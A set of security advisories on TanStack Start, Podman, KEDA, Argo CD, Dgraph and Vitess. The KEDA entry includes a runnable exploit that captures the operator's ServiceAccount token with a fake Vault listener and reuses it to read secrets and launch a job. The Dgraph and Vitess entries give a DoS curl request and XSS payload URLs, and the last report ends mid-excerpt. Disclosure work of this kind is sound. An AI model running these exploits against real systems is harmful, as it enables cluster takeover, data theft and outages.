summary: TanStack Router: Unauthenticated reflected XSS in TanStack Start server-function responses
description:
## Impact

An unauthenticated attacker can craft a URL to a server function in an affected TanStack Start app. If someone opens the link, the app can return attacker-controlled HTML from its own origin and run the attacker's JavaScript there. The script can access same-origin data available to that visitor and make requests with their authority.

## Cause

The server-function transport can pass request payload fields into internal middleware state instead of limiting them to public input fields. A malformed payload can leave an attacker-controlled result in the error path. Response handling can then treat a response-shaped object as an HTTP response.

## Affected versions

Published versions of `@tanstack/start-server-core`, `@tanstack/react-start`, `@tanstack/solid-start`, and `@tanstack/vue-start` from `1.143.12` up to, but not including, their respective patched versions are affected. The patched versions are `@tanstack/start-server-core@1.169.39`, `@tanstack/react-start@1.168.60`, `@tanstack/solid-start@1.168.57`, and `@tanstack/vue-start@1.168.56`.

## Fix

The fix limits client-supplied server-function input to public fields and validates responses at the server boundary. Upgrade to the corresponding patched package version.

## Temporary mitigations

For the configured server-function path, usually `/_serverFn/*`, an edge or WAF rule can consider blocking requests without the literal `x-tsr-serverFn: true` header and browser document navigations such as `Sec-Fetch-Mode: navigate` or `Accept: text/html`. A restrictive Content Security Policy on server-function responses can provide another browser-side restriction. These are mitigation suggestions, not a complete fix. The header is client-controlled and is not authentication. Test rules against legitimate GET and POST server functions and use a matching version-specific backport where possible.

## Credits

Lovable helped us discover and report this issue. We thank them for their help.

cwes.name: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

summary: Podman: The `podman run` command can be instructed to disable almost all sandboxing by image annotation
description:
### Impact
Podman v4.4.0 added a feature where container checkpoints (from the `podman container checkpoint` command) could be distributed via OCI registry, and pulled from that registry and run via the `podman run` command. This allowed easy transfer of checkpoints between systems. However, checkpoints allow complete control of how the container is created - including full control of the container sandbox. When `podman run` detects a checkpoint, it will silently ignore all user input regarding how the container should be created - for example, `podman run --cap-drop=ALL` on an image that is determined to be a checkpoint will ignore `--cap-drop=all` and use the set of capabilities specified by the checkpoint image instead, which could include all capabilities. Podman identifies checkpoint images by looking for an annotation, `io.podman.annotations.checkpoint.runtime.name`. If this annotation is set, the image is treated as a checkpoint. Conflating container images and checkpoints in `podman run` allows inherently insecure behavior as the image can now control how it is executed. The Podman Maintainers have determined that the safest course of action is to remove this functionality.

### Patch
The commit introducing this functionality was reverted.

3721ff82ffb44a4ceeaecc5abd3808e924a6b669 c74b1d37b3fb834b0de43e176565d9d8c254b627 fa6cef22c2baf3987b581c673bb416ef0585daf7 (main)
ea9243e04d1db3886dc3a51ee3300ffb547cfc02 450c64426dbcff1097d3c7911d791101e3d16f4c 2d05a7c61f022d4f24980ea6d307fa53da2b8692 (v6.1)
7728ba0a90094408ad9078e36c3622a651d49616 24706290d5c974f078d8ca284026802515f28e92 29c8c6e50607df7a7d735ace09ff0ea099c0b3e0 (v5.8)

### Workarounds
Images being pulled should be scanned for the `io.podman.annotations.checkpoint.runtime.name` annotation, and rejected if it is present. Podman does not presently have the ability to perform this scanning and rejection automatically.

Also not that rootless containers are not affected as they do not support checkpoint/restore at all currently.

### Credits
This vulnerability was discovered by ADA Logics Ltd using Anthropic's Claude models.

summary: KEDA: Privilege escalation from namespace admin to cluster admin via KEDA TriggerAuthentication
description:
## Summary

A namespace admin who creates a `TriggerAuthentication` and a `ScaledObject` in their own namespace can make the KEDA operator send its own ServiceAccount token to a tenant-controlled URL. That token holds `["*"]/["*"] get` cluster-wide, so it reads every Secret in every namespace, plus `batch/jobs` and `horizontalpodautoscalers` create/delete cluster-wide, `*/scale` update on any workload, `validatingwebhookconfigurations` update (rewrite or disable cluster admission), and `apiservices` update (hijack aggregated API routing). This is effectively privilege escalation from namespace admin to cluster admin in real environments: a cluster-wide Secret read alone is enough to find a token for a more privileged ServiceAccount, and the cluster-wide `batch/jobs` create lets the attacker run a workload in any namespace whose Pod Security Admission level permits it (or that is PSA-exempt, such as `kube-system` , `kyverno`) to reach the node filesystem and a control-plane kubeconfig.

This is an incomplete fix of CVE-2025-68476: its content filter only requires the loaded file to be a JWT whose subject begins with `system:serviceaccount:`, which the operator's own projected token satisfies by construction. The destination field `hashiCorpVault.address` is unvalidated.

Finder credits: Artem Cherezov @cherez0ff, with Claude Opus 4.8

## Verified live

kind v1.31.2, kedacore/keda v2.20.0 (latest at the time of audit, <https://github.com/kedacore/keda>) installed from the unmodified release manifest `keda-2.20.0.yaml` (`ghcr.io/kedacore/keda:2.20.0`), default settings.

## Preconditions

1. The tenant holds `create` on `triggerauthentications.keda.sh` and `scaledobjects.keda.sh` in its own namespace (the documented KEDA tenant workflow), plus the built-in `edit` ClusterRole in that namespace. Often granted by a namespaced admin Role (`--verb='*' --resource='*.*'`) in multi-tenant environments.
2. KEDA is installed with default settings.

## Reproduction

### Cluster preparation (not part of the attack)

```sh
kind create cluster --image kindest/node:v1.31.2 --name keda-poc --kubeconfig ./kubeconfig
export KUBECONFIG=./kubeconfig

# Install KEDA v2.20.0 (unmodified vendor release manifest).
curl -sSL -o keda-2.20.0.yaml https://github.com/kedacore/keda/releases/download/v2.20.0/keda-2.20.0.yaml
kubectl apply --server-side -f keda-2.20.0.yaml
kubectl wait --for=condition=Established crd/triggerauthentications.keda.sh crd/scaledobjects.keda.sh --timeout=120s
kubectl -n keda rollout status deploy/keda-operator --timeout=180s

# Tenant identity: namespace admin in tenant-a.
kubectl create namespace tenant-a
kubectl -n tenant-a create serviceaccount tenant
kubectl -n tenant-a create rolebinding tenant-edit --clusterrole=edit --serviceaccount=tenant-a:tenant
kubectl -n tenant-a create role tenant-keda --verb=create,get --resource=triggerauthentications.keda.sh,scaledobjects.keda.sh
kubectl -n tenant-a create rolebinding tenant-keda --role=tenant-keda --serviceaccount=tenant-a:tenant

# Mint a tenant kubeconfig from a real TokenRequest token.
SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
CA=$(kubectl config view --minify --raw -o jsonpath='{.clusters[0].cluster.certificate-authority-data}')
TOKEN=$(kubectl -n tenant-a create token tenant --duration=24h)
cat > kubeconfig-tenant <<EOF
apiVersion: v1
kind: Config
clusters:
- name: kind
  cluster: { server: ${SERVER}, certificate-authority-data: ${CA} }
contexts:
- name: tenant
  context: { cluster: kind, user: tenant, namespace: tenant-a }
current-context: tenant
users:
- name: tenant
  user: { token: ${TOKEN} }
EOF

# Seed a "secret" canary in kube-system to make impact self-evident.
kubectl -n kube-system create secret generic poc-canary --from-literal=canary=KEDA-F1-CANARY-7f3a9c2e
```

### Attack

1. Deploy a listener in the tenant namespace that impersonates a HashiCorp Vault server. It logs the login request body and replies with a well-formed Vault auth envelope. The KEDA operator uses the Vault Go client, which issues the login as an HTTP `PUT`, so the listener must accept all methods.

```sh
kubectl --kubeconfig=./kubeconfig-tenant apply -f - <<'EOF'
apiVersion: v1
kind: ConfigMap
metadata: { name: fake-vault-src, namespace: tenant-a }
data:
  vault.py: |
    import http.server, socketserver, sys, json
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _h(self):
            ln=int(self.headers.get('Content-Length') or 0)
            body=self.rfile.read(ln) if ln else b''
            sys.stdout.write("VAULT-LOGIN %s %s\n%s\n"%(self.command,self.path,body.decode('utf-8','replace'))); sys.stdout.flush()
            r=json.dumps({"auth":{"client_token":"s.poc","lease_duration":3600,"renewable":True,"policies":["default"]}}).encode()
            self.send_response(200); self.send_header("Content-Type","application/json"); self.send_header("Content-Length",str(len(r))); self.end_headers(); self.wfile.write(r)
        do_GET=do_POST=do_PUT=do_DELETE=do_OPTIONS=do_HEAD=_h
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("0.0.0.0",8200),H) as s: s.serve_forever()
---
apiVersion: v1
kind: Pod
metadata: { name: fake-vault, namespace: tenant-a, labels: { app: fake-vault } }
spec:
  containers:
  - name: vault
    image: python:3.12-slim@sha256:090ba77e2958f6af52a5341f788b50b032dd4ca28377d2893dcf1ecbdfdfe203
    command: ["python3","/src/vault.py"]
    volumeMounts: [{ name: src, mountPath: /src }]
  volumes: [{ name: src, configMap: { name: fake-vault-src } }]
---
apiVersion: v1
kind: Service
metadata: { name: fake-vault, namespace: tenant-a }
spec:
  selector: { app: fake-vault }
  ports: [{ port: 8200, targetPort: 8200 }]
EOF
kubectl --kubeconfig=./kubeconfig-tenant -n tenant-a wait --for=condition=Ready pod/fake-vault --timeout=120s
```

2. Create the `TriggerAuthentication` (the primitive) and a `ScaledObject` with a `cron` trigger referencing it. With `authentication: kubernetes` and no `credential` block, KEDA defaults `credential.serviceAccount` to the operator pod's own token path.

```sh
kubectl --kubeconfig=./kubeconfig-tenant apply -f - <<'EOF'
apiVersion: keda.sh/v1alpha1
kind: TriggerAuthentication
metadata: { name: vault-auth, namespace: tenant-a }
spec:
  hashiCorpVault:
    address: http://fake-vault.tenant-a.svc:8200   # tenant-controlled destination, no validation
    authentication: kubernetes
    mount: kubernetes
    role: poc
    secrets:
    - { parameter: anything, key: anything, path: secret/data/anything }
---
apiVersion: keda.sh/v1alpha1
kind: ScaledObject
metadata: { name: poc-so, namespace: tenant-a }
spec:
  scaleTargetRef: { name: poc-target }
  pollingInterval: 5
  minReplicaCount: 0
  maxReplicaCount: 2
  triggers:
  - type: cron
    metadata: { timezone: UTC, start: "0 * * * *", end: "30 * * * *", desiredReplicas: "1" }
    authenticationRef: { name: vault-auth }
---
apiVersion: apps/v1
kind: Deployment
metadata: { name: poc-target, namespace: tenant-a }
spec:
  replicas: 1
  selector: { matchLabels: { app: poc-target } }
  template:
    metadata: { labels: { app: poc-target } }
    spec:
      containers: [{ name: pause, image: registry.k8s.io/pause:3.10 }]
EOF
```

3. The operator reconciles the `ScaledObject`, builds the scaler, resolves the `authenticationRef`, and PUTs its own ServiceAccount token to the listener as the Vault login body. Read it back:

```sh
sleep 20
kubectl --kubeconfig=./kubeconfig-tenant -n tenant-a logs pod/fake-vault | grep -A1 'VAULT-LOGIN PUT'
# VAULT-LOGIN PUT /v1/auth/kubernetes/login
# {"jwt":"eyJhbGciOiJSUzI1NiIs...","role":"poc"}
```

4. Build a kubeconfig from the stolen token and use it. The token authenticates as the operator ServiceAccount and reads the kube-system Secret the tenant could not read directly:

```sh
STOLEN=$(kubectl --kubeconfig=./kubeconfig-tenant -n tenant-a logs pod/fake-vault \
  | sed -n 's/.*"jwt":"\([^"]*\)".*/\1/p' | head -1)
cat > kubeconfig-stolen <<EOF
apiVersion: v1
kind: Config
clusters:
- name: kind
  cluster: { server: ${SERVER}, certificate-authority-data: ${CA} }
contexts:
- name: stolen
  context: { cluster: kind, user: stolen }
current-context: stolen
users:
- name: stolen
  user: { token: ${STOLEN} }
EOF

kubectl --kubeconfig=./kubeconfig-stolen auth whoami
# Username  system:serviceaccount:keda:keda-operator

kubectl --kubeconfig=./kubeconfig-stolen -n kube-system get secret poc-canary -o jsonpath='{.data.canary}' | base64 -d
# KEDA-F1-CANARY-7f3a9c2e

# The token also creates workloads cluster-wide via batch/jobs; a Job lands a pod in kube-system.
kubectl --kubeconfig=./kubeconfig-stolen -n kube-system create job pwn --image=busybox -- sh -c 'sleep 60'
# job.batch/pwn created
kubectl --kubeconfig=./kubeconfig-stolen -n kube-system get pods -l job-name=pwn
# pwn-q5j5s   1/1   Running   0   8s
```

## Root cause

A namespace tenant should not be able to make the operator authenticate to a tenant-controlled server using the operator's own cluster-privileged identity. The destination address is fully tenant-controlled and unvalidated, and the credential the operator presents defaults to its own ServiceAccount token. The content filter added for the prior arbitrary-file-read advisory checks only that the loaded bytes look like a Kubernetes ServiceAccount token, which is exactly the shape of the operator's own token, so it does not constrain the credential to one the tenant is entitled to use.

summary: Argo CD: AppProject destination-namespace and resource restrictions bypassed by PreDelete/PostDelete resource hooks
description:
### Impact

Argo CD checks an Application's AppProject before it creates resources during a sync. That check covers destination namespaces and servers, cluster-scoped resource allow and deny lists, and namespaced resource allow and deny lists, including resource names. PreDelete and PostDelete hooks skip it. When the Application is deleted, Argo CD creates those hooks with the application-controller's credentials on the destination cluster.

All versions from v2.10.0 onward are affected, including every currently supported release. v2.9.22 and earlier are not. PostDelete hooks were introduced in [dcc17f70bf](https://github.com/argoproj/argo-cd/commit/dcc17f70bf7db973fe480b8b613189b2c5ac4b4b) (2023-12-18, [#16595](https://github.com/argoproj/argo-cd/pull/16595)) and first released in v2.10.0. That creation path has never applied the project check. PreDelete hooks, added in [3bf3d8a212](https://github.com/argoproj/argo-cd/commit/3bf3d8a2124e772ac651f3fd42375c4e9b8008af) (2025-12-05, [#22288](https://github.com/argoproj/argo-cd/pull/22288)) and first released in v3.3.0, use the same path. v3.2.12 and earlier do not have PreDelete hooks. PreSync, Sync, PostSync, and SyncFail hooks still go through the project check.

A user who can push to the Git repository an Application syncs from can commit a hook whose namespace, group, kind, or name the AppProject would refuse on sync. The controller adds the delete finalizer when it sees the hook, and the Application stays Synced until someone deletes it. Deleting the Application creates the hook. What that can reach is bounded by the application-controller's access to the destination cluster. In a typical install that access is broad, so a tenant can create a cluster-scoped object such as a `ClusterRoleBinding`, or an object in a namespace the project does not allow. A hook with no deletion policy is removed after it succeeds. A deletion policy that does not remove the hook on success leaves the object in the cluster. A hook such as a Job can create further objects that Argo CD does not clean up.

### Patches

A patch for this vulnerability has been released in the following Argo CD versions:

* v3.6.0-rc2
* v3.5.4
* v3.4.10
* v3.3.15

The fix applies the same AppProject destination and resource checks used on sync before creating a PreDelete or PostDelete hook.

Argo CD 2.x and 3.0 through 3.2 are out of support and will not receive a patch. Upgrade to a patched 3.3 or newer release.

### Workarounds

There is no configuration setting that applies the project check to delete hooks while those hooks stay in use.

* Do not grant untrusted users write access to Git repositories that back Applications in restrictive AppProjects.
* Limit who can delete Applications. Deletion is what runs PreDelete and PostDelete hooks.
* Tighten the application-controller's Kubernetes access so a hook cannot reach sensitive namespaces or APIs.

### Credits

The Argo CD team would like to thank @RealFakeAccount, @AdamKorcz, @0xshylines, @thevilledev, @HenriWilliams, @cherez0ff, @ARSB1, and @zwindler for responsibly disclosing this issue according to our [security reporting guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability).

### References

* PostDelete introducing commit: [dcc17f70bf7db973fe480b8b613189b2c5ac4b4b](https://github.com/argoproj/argo-cd/commit/dcc17f70bf7db973fe480b8b613189b2c5ac4b4b) ([#16595](https://github.com/argoproj/argo-cd/pull/16595)), first released in v2.10.0
* PreDelete introducing commit: [3bf3d8a2124e772ac651f3fd42375c4e9b8008af](https://github.com/argoproj/argo-cd/commit/3bf3d8a2124e772ac651f3fd42375c4e9b8008af) ([#22288](https://github.com/argoproj/argo-cd/pull/22288)), first released in v3.3.0
* [AppProject specification](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/)
* [Resource hooks](https://argo-cd.readthedocs.io/en/stable/user-guide/resource_hooks/)

### For more information

* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)
* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd

summary: Dgraph: Zero Unauthenticated HTTP Admin removeNode Denial of Service
description: ### Summary Dgraph `v25.3.8` exposes a Zero HTTP administrative surface that is unauthenticated when port `6080` is reachable. The exposed routes include: - `/state` - `/assign` - `/removeNode` - `/moveTablet` An unauthenticated request to `/removeNode?id=1&group=0` on a single-node standalone deployment breaks the Zero control plane and leaves Alpha repeatedly failing to reconnect to `localhost:5080`. ### Details The issue exists because Zero administrative HTTP endpoints are registered directly without any authentication or IP-whitelist wrapper. Relevant code paths: - `worker/server_state.go:41` - `dgraph/cmd/zero/run.go:295-301` - `dgraph/cmd/zero/http.go:106-129` - `dgraph/cmd/zero/zero.go:475-477` The relevant behavior is: - `disable-admin-http=false` by default - `/removeNode` accepts attacker-controlled `id` and `group` - `removeNode` forwards those directly into `Server.RemoveNode` - for `group=0`, `Server.RemoveNode` immediately calls `ProposePeerRemoval` This means a remote unauthenticated caller can directly trigger destructive membership operations if `6080` is exposed. ### PoC ### Read state without authentication ```bash curl -i http://127.0.0.1:6080/state ``` Observed response included: - Zero node `id=1` - `groupId=0` - `leader=true` - cluster topology and tablet state ### Write-capable route without authentication ```bash curl -i 'http://127.0.0.1:6080/assign?what=nsids&num=1' ``` Observed response: ```text HTTP/1.1 200 OK ... {"startId":"1", "endId":"1", "readOnly":"0"} ``` This confirms the admin plane is not merely informational. ### Destructive unauthenticated removeNode ```bash curl -i 'http://127.0.0.1:6080/removeNode?id=1&group=0' ``` Observed result: ```text curl: (52) Empty reply from server ``` Immediately afterward: ```bash curl -i http://127.0.0.1:6080/health ``` Observed result: ```text curl: (56) Recv failure: Connection reset by peer ``` Alpha health was still locally reachable, but Alpha logs began repeatedly reporting: ```text dial tcp [::1]:5080: connect: connection refused ``` This confirms the request reached the destructive path and disrupted the Zero control plane. ### Impact Any deployment that exposes Zero HTTP on `6080` exposes destructive unauthenticated administrative capabilities. An attacker can: - read cluster topology and control-plane metadata - allocate IDs and timestamps - invoke destructive membership actions - disrupt the Zero control plane - indirectly destabilize Alpha nodes that depend on Zero connectivity This is a high-value unauthenticated administrative exposure and, in the reproduced case, a practical denial of service against the control plane.

From: xylove21 To: security@vitess.io Subject: [Security Report] Vitess vttablet /twopcz reflected XSS Date: Tue, 24 Jun 2026 14:30:00 +0800 ## Summary The `twopczHandler` in `go/vt/vttablet/tabletserver/twopcz.go` (line 185) reflects the `Action` and `dtid` form values directly into the HTML response body via `fmt.Fprintln(w, msg)` — **without HTML escaping**. The response is served as `text/html; charset=utf-8`, and Vitess's default `acl` policy is **allow-all**, so the endpoint is reachable by anyone who can hit the vttablet's HTTP port (default `15999`, multiplexed with gRPC and MySQL wire-protocol ports). A crafted `Action` or `dtid` value yields a **reflected XSS** that executes in the operator's browser with same-origin access to the vttablet's debug endpoints. This includes `/queryz` (live query plans), `/querylogz` (recent queries with bound values), `/txlogz` (transactions), `/debug/env` (environment variables — may include MySQL/topology credentials), `/debug/vars` (expvar stats), and `/debug/pprof/*` if enabled. The bug was introduced before v20.0.0 (long-standing) and was silently fixed in commit `3140c1846c` (merged 2026-06-09, PR #20255, "tabletserver: escape reflected form values in twopcz handler"). The fix replaces `fmt.Fprintln(w, msg)` with `fmt.Fprintln(w, html.EscapeString(msg))`. **No released version of Vitess contains the fix** — the fix lives only on `main` (current tip `33a3c0fafe69`, 2026-06-23). There is **no CVE, GHSA, or OSV entry** for this specific bug (verified 2026-06-24 against GitHub Advisory Database, OSV.dev, and NVD). ## Impact | Field | Value | |-------|-------| | **Type** | Reflected Cross-Site Scripting (XSS) | | **CVSS 3.1** | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` = **7.7 HIGH** | | **Attack Vector** | Network (vttablet HTTP port 15999, multiplexed with gRPC/MySQL) | | **Attack Complexity** | Low (craft URL, send to operator) | | **Privileges Required** | None (default `acl` policy is allow-all) | | **User Interaction** | Required (operator must visit crafted URL) | | **Scope** | Changed (XSS chain reaction to other vttablet debug endpoints) | | **Confidentiality** | High (query text, env vars, expvar stats) | | **Integrity** | None (XSS itself doesn't change state) | | **Availability** | None (XSS itself doesn't disrupt service) | ### Affected versions (verified) All released versions are vulnerable. The fix lives only on `main`: | Tag | Released | `twopcz.go` line 185 | Status | |---|---|---|---| | v20.0.0 | 2024-06-27 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v20.0.1 - v20.0.6 | 2024 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v22.0.4 | 2026-02-27 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v23.0.3, v23.0.4 | 2026-02 / 2026-05 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v24.0.0, v24.0.1 | 2026-04 / 2026-05 | `fmt.Fprintln(w, msg)` | **BUGGY** | | **main** (`33a3c0fafe69`) | 2026-06-23 | `fmt.Fprintln(w, html.EscapeString(msg))` | **FIXED** | ### Sensitive data exposed via the same-origin XSS chain A successful XSS lands in the vttablet's origin. From there, the attacker can fetch (via `fetch()` from injected JavaScript) the following same-origin endpoints, all of which are unauthenticated by default: - `/twopcz` — in-flight 2PC transactions (query text, parameters, dtid) - `/queryz` — live query plans - `/querylogz` — recent queries with bound values - `/txlogz` — transactions - `/debug/env` — environment variables (may include MySQL creds, topology credentials, encryption keys) - `/debug/vars` — expvar stats - `/debug/pprof/*` — CPU/memory profiles (if enabled) ## Reproduction (independent, runnable PoC) The PoC is a self-contained Go HTTP server that replicates the buggy `twopczHandler` from Vitess v20.0.0 verbatim (using the same line-185 code). It runs on `127.0.0.1:15080` and returns the same response shape as the real Vitess endpoint. ```bash # 1) Build the PoC (Go 1.23+) cd /path/to/finding/CVE-pending-twopcz-xss go build -o /tmp/vitess-twopcz-poc ./poc.go # 2) Start the buggy server ADDR=127.0.0.1:15080 /tmp/vitess-twopcz-poc & # 3) Reproduce — Test 1: bare GET (no params) curl -sS -i "http://127.0.0.1:15080/twopcz" # → Content-Type: text/html; charset=utf-8, status 200 # 4) Test 2: XSS via Action param (URL-encode the script tag) curl -sS -i "http://127.0.0.1:15080/twopcz?Action=%3Cscript%3Ealert(1)%3C%2Fscript%3E&dtid=zz" # → Response body contains literal "(zz): completed." # → Browser executes the script as same-origin code # 5) Test 3: XSS via dtid param (attribute-context payload) curl -sS -i "http://127.0.0.1:15080/twopcz?Action=Demo&dtid=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" # → Response body contains literal "" # → Browser fires the onerror handler as same-origin code # 6) Run the 3x automated runner (writes evidence/run-{1,2,3}.log) bash ./poc/run.sh ``` PoC result excerpt (from `evidence/run-1.log`): ``` --- Test 2: XSS via Action= --- HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8 ...
